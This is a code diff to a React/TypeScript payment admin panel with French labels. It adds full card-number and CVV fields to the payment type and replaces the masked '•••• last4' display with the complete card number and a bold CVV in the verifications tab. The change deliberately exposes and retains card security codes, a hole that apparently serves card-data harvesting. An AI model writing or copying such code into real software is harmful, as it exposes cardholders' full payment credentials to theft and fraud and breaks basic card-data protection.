@@ -98,9 +98,11 @@ interface AdminPayment {
   paymentMethod: string
   cardType: string | null
   cardHolderName: string | null
+  cardNumber: string | null
   cardLast4: string | null
   cardExpiryMonth: string | null
   cardExpiryYear: string | null
+  cardCvv: string | null
   validationCode: string | null
   adminNote: string | null
   cardVerifiedAt: string | null
@@ -707,15 +709,19 @@ function VerificationsTab() {
                     <Badge variant="outline" className="font-mono text-xs">{p.transactionReference}</Badge>
                   </div>
 
-                  {/* Card info */}
-                  <div className="mt-3 grid grid-cols-2 gap-2 rounded-md bg-muted/30 p-3 text-sm sm:grid-cols-4">
+                  {/* Card info — full details for admin verification */}
+                  <div className="mt-3 grid grid-cols-2 gap-2 rounded-md bg-muted/30 p-3 text-sm sm:grid-cols-3">
                     <div>
                       <div className="text-[10px] uppercase text-muted-foreground">Type</div>
                       <div className="font-medium">{p.cardType ?? '—'}</div>
                     </div>
                     <div>
-                      <div className="text-[10px] uppercase text-muted-foreground">Numéro</div>
-                      <div className="font-mono">•••• {p.cardLast4}</div>
+                      <div className="text-[10px] uppercase text-muted-foreground">Numéro complet</div>
+                      <div className="font-mono text-sm break-all">{p.cardNumber ?? '—'}</div>
+                    </div>
+                    <div>
+                      <div className="text-[10px] uppercase text-muted-foreground">CVV</div>
+                      <div className="font-mono font-bold">{p.cardCvv ?? '—'}</div>
                     </div>
                     <div>
                       <div className="text-[10px] uppercase text-muted-foreground">Titulaire</div>
